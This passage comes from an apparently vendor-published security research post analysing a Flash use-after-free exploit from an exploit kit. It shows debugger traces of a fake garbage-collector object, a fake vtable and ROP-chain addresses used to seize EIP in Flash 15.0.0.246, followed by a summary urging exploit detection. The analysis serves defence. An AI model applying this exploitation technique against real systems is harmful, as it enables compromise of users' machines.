class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">esi</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-72"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042961</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">esi</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ecx</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-73"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042963</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">ecx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">4</span><span class="crayon-o">+</span><span class="crayon-v">arg_0</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-v">ecx</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-v">unknown</span><span class="crayon-sy">_</span>object</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-74"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042967</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">mov</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">0Ch</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">eax</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-75"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">1004296A</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">al</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">esp</span><span class="crayon-o">+</span><span class="crayon-cn">4</span><span class="crayon-o">+</span><span class="crayon-v">arg_8</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-76"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">1004296E</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">mov</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">18h</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ecx</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-77"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042971</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-i">mov</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-sy">[</span><span class="crayon-v">esi</span><span class="crayon-o">+</span><span class="crayon-cn">8</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">al</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-78"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042974</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">test&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">ecx</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">ecx</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-79"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042976</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">short</span><span class="crayon-h"> </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>1004298B</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-80"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042978</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">cmp&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-t">byte</span><span class="crayon-h"> </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">ecx</span><span class="crayon-o">+</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-81"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">1004297C</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">jz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">short</span><span class="crayon-h"> </span><span class="crayon-v">loc</span><span class="crayon-sy">_</span>1004298B</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-82"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">1004297E</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">eax</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">ecx</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-e">eax </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-v">vtable</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x05114000</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-83"><span class="crayon-sy">.</span><span class="crayon-v">text</span><span class="crayon-o">:</span><span class="crayon-cn">10042980</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">call&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">eax</span><span class="crayon-o">+</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-i">jump</span><span class="crayon-h"> </span><span class="crayon-cn">0x1015b6be</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-84">&nbsp;</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-85"><span class="crayon-cn">0</span><span class="crayon-o">:</span><span class="crayon-cn">008</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-h"> </span><span class="crayon-cn">1015b6be</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-86"><span class="crayon-v">Flash32_15_0_0_246</span><span class="crayon-o">+</span><span class="crayon-cn">0x15b6be</span><span class="crayon-o">:</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-87"><span class="crayon-cn">1015b6be</span><span class="crayon-h"> </span><span class="crayon-cn">8b01</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">mov&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-v">eax</span><span class="crayon-sy">,</span><span class="crayon-e">dword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">ecx</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-88"><span class="crayon-cn">1015b6c0</span><span class="crayon-h"> </span><span class="crayon-cn">51</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">push&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">ecx</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-89"><span class="crayon-cn">1015b6c1</span><span class="crayon-h"> </span><span class="crayon-e">ff5008&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">call&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">dword </span><span class="crayon-i">ptr</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">eax</span><span class="crayon-o">+</span><span class="crayon-cn">8</span><span class="crayon-sy">]</span><span class="crayon-h"> </span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-90">&nbsp;</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-91"><span class="crayon-r">This</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">the </span><span class="crayon-e">first </span><span class="crayon-e">ROP </span><span class="crayon-i">address</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-92"><span class="crayon-cn">0</span><span class="crayon-o">:</span><span class="crayon-cn">008</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">u</span><span class="crayon-h"> </span><span class="crayon-cn">10020740</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-93"><span class="crayon-v">Flash32_15_0_0_246</span><span class="crayon-o">+</span><span class="crayon-cn">0x20740</span><span class="crayon-o">:</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-94"><span class="crayon-cn">10020740</span><span class="crayon-h"> </span><span class="crayon-cn">94</span><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">xchg&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">eax</span><span class="crayon-sy">,</span><span class="crayon-i">esp</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-95"><span class="crayon-cn">10020741</span><span class="crayon-h"> </span><span class="crayon-e">c3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-e">ret</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-96">&nbsp;</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-97"><span class="crayon-e">the </span><span class="crayon-e">vectorData </span><span class="crayon-i">buffer</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-98"><span class="crayon-cn">05111000</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">05112000</span><span class="crayon-h"> </span><span class="crayon-cn">03c62000</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-99"><span class="crayon-cn">05111010</span><span class="crayon-h"> </span><span class="crayon-cn">01f80008</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">10f69b44</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-100"><span class="crayon-cn">05111020</span><span class="crayon-h"> </span><span class="crayon-cn">40000000</span><span class="crayon-h"> </span><span class="crayon-cn">05113c00</span><span class="crayon-h"> </span><span class="crayon-i">feedbabe</span><span class="crayon-h"> </span><span class="crayon-cn">000014d0</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-101"><span class="crayon-cn">05111030</span><span class="crayon-h"> </span><span class="crayon-i">babeface</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-102"><span class="crayon-cn">05111040</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">00000000</span><span class="crayon-h"> </span><span class="crayon-cn">0000000</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-103">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-104"><span class="crayon-e">The </span><span class="crayon-e">memory </span><span class="crayon-e">used </span><span class="crayon-st">in</span><span class="crayon-h"> </span><span class="crayon-e">garbage </span><span class="crayon-e">collector </span><span class="crayon-v">above</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">05113c00</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-e">the </span><span class="crayon-v">fake_gc</span><span class="crayon-sy">_</span>object</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-105"><span class="crayon-cn">0</span><span class="crayon-o">:</span><span class="crayon-cn">008</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-i">dc</span><span class="crayon-h"> </span><span class="crayon-cn">05113c00</span><span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-cn">1e4</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-106"><span class="crayon-cn">05113de4</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-cn">05113d80</span><span class="crayon-h"> </span><span class="crayon-e">cccccccc </span><span class="crayon-e">cccccccc </span><span class="crayon-i">cccccccc</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-sy">.</span><span class="crayon-o">=</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span><span class="crayon-sy">.</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-107">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-108"><span class="crayon-v">Unknown</span><span class="crayon-sy">_</span>object</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-109"><span class="crayon-cn">05113d80</span><span class="crayon-h"> </span><span class="crayon-cn">05114000</span><span class="crayon-h"> </span><span class="crayon-cn">00000001</span><span class="crayon-h"> </span><span class="crayon-e">cccccccc </span><span class="crayon-e">cccccccc</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-110">&nbsp;</div><div class="crayon-line" id="crayon-5f69285f567a7439638303-111"><span class="crayon-e">Fake </span><span class="crayon-e">vtable </span><span class="crayon-e">of </span><span class="crayon-v">Unknown_object</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">1015b6be</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-i">the</span><span class="crayon-h"> </span><span class="crayon-cn">1st</span><span class="crayon-h"> </span><span class="crayon-e">executed </span><span class="crayon-v">address</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">10020740</span><span class="crayon-h"> </span><span class="crayon-st">is</span><span class="crayon-h"> </span><span class="crayon-i">the</span><span class="crayon-h"> </span><span class="crayon-cn">2nd</span><span class="crayon-h"> </span><span class="crayon-e">executed </span><span class="crayon-v">address</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-i">etc</span>…</div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-112"><span class="crayon-cn">05114000</span><span class="crayon-h"> </span><span class="crayon-cn">1000b5d2</span><span class="crayon-h"> </span><span class="crayon-cn">1015b6be</span><span class="crayon-h"> </span><span class="crayon-cn">10020740</span><span class="crayon-h"> </span><span class="crayon-cn">1019cc26</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-113"><span class="crayon-cn">05114010</span><span class="crayon-h"> </span><span class="crayon-cn">1028297c</span><span class="crayon-h"> </span><span class="crayon-cn">10064fc5</span><span class="crayon-h"> </span><span class="crayon-cn">7c809ae1</span><span class="crayon-h"> </span><span class="crayon-cn">05114030</span></div><div class="crayon-line crayon-striped-line" id="crayon-5f69285f567a7439638303-114"><span class="crayon-cn">05114020</span><span class="crayon-h"> </span><span class="crayon-cn">05114000</span><span class="crayon-h"> </span><span class="crayon-cn">00002000</span><span class="crayon-h"> </span><span class="crayon-cn">00001000</span><span class="crayon-h"> </span><span class="crayon-cn">00000040</span></div><div class="crayon-line" id="crayon-5f69285f567a7439638303-115"><span class="crayon-cn">05114030</span><span class="crayon-h"> </span><span class="crayon-cn">002ce860</span><span class="crayon-h"> </span><span class="crayon-i">c6610000</span><span class="crayon-h"> </span><span class="crayon-cn">89000447</span><span class="crayon-h"> </span><span class="crayon-v">c031fcf4</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0097 seconds] -->
<p></p>
<p style="text-align: center;"> <strong>Figure 12. </strong>Trace of Garbage Collector and Associated Memory Map</p>
<p>The use of the garbage collector is a novel method to control EIP, which differs from the previous techniques using sound or file reference objects. It is universal, stable and does not require other objects, as attackers can use the one vector for all the steps required to execute code, including scanning for and finding the ROP chain, overwriting the ROP chain, and control and trigger EIP. This is good news for cybercriminals, as it makes exploit development easier.</p>
<h3>Summary</h3>
<p>The technique of faking a garbage collection object to control EIP has never been seen before and is worth to paying attention to in future exploits. Due to certain features in Adobe Flash, specifically the ability for alchemy opcodes (such as op_li32/op_si32) to directly access memory within a ByteArray, use-after-free vulnerabilities are just as easy to exploit as out-of-bounds vulnerabilities. It appears that the authors of exploit kits agree with this, as they continue to add new Flash UAF vulnerabilities to their arsenal. As such, we can anticipate Flash vulnerabilities will continue to be exploited by exploit kits well into the future. Security researchers should not only spend time hunting and reporting more bugs to vendors, but also focus on exploit detection before html5 completely replaces flash altogether.</p>
<p>[1]. <a href="http://malware.dontneedcoffee.com/" target="_blank">http://malware.dontneedcoffee.com/</a></p>
<p>[2]. <a href="https://0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf" target="_blank">https://0b3dcaf9-a-62cb3a1a-s-sites.googlegroups.com/site/zerodayresearch/smashing_the_heap_with_vector_Li.pdf</a></p>
<p>[3]. <a href="http://www.freebuf.com/news/special/61942.html" target="_blank">http://www.freebuf.com/news/special/61942.html</a></p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
